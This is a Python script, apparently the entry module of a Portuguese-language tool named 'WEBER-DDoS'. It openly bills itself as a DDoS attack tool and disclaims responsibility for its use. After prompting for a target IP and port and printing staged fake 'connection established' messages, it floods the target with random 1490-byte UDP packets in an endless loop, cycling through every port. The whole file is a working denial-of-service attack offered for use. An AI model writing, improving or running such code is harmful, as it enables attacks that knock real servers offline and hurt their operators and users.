# weber_ddos/__main__.py

import os
import time
import socket
import random
from pyfiglet import figlet_format

def banner():
    os.system("clear")
    print("\033[92m")
    print(figlet_format("WEBER-DDoS", font="slant"))
    print()
    print("Autor   : Jeth Weber")
    print("Github  : github.com/JethWeber")
    print("OBS - Ferramenta para ataques DDoS. Use como bem entenderes mas se te pegarem sevira!")
    print()

def simulate_connection():
    print("\033[92m")
    print("________________TENTANDO ENCONTRAR O SERVIDOR_____________________")
    time.sleep(2)
    print("_________________ESTABELECENDO A CONEXÃO_______________________")
    time.sleep(2)
    print("_________0100100 FATIGANDO A CAMADA DE SEGURANÇA 001010_______________")
    time.sleep(2)
    print("_________________CONEXÃO ESTABELECIDA________________________")
    time.sleep(2)
    print("    COMEÇOU O ATAQUE DDoS. OBS: NÃO ME RESPONSABILIZO PELOS TEUS ATOS...")
    time.sleep(2)

def main():
    banner()
    ip = input("IP do Alvo : ")
    port = int(input("Porta      : "))
    os.system("clear")
    print(figlet_format("WEBER-DDoS", font="slant"))
    print("Team : WEBER-DoS")
    simulate_connection()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_ = random._urandom(1490)
    sent = 0

    while True:
        sock.sendto(bytes_, (ip, port))
        sent += 1
        port += 1
        print(f"Enviando {sent} Pacote para {ip} pela porta:{port}")
        if port >= 65534:
            port = 1

if __name__ == "__main__":
    main()
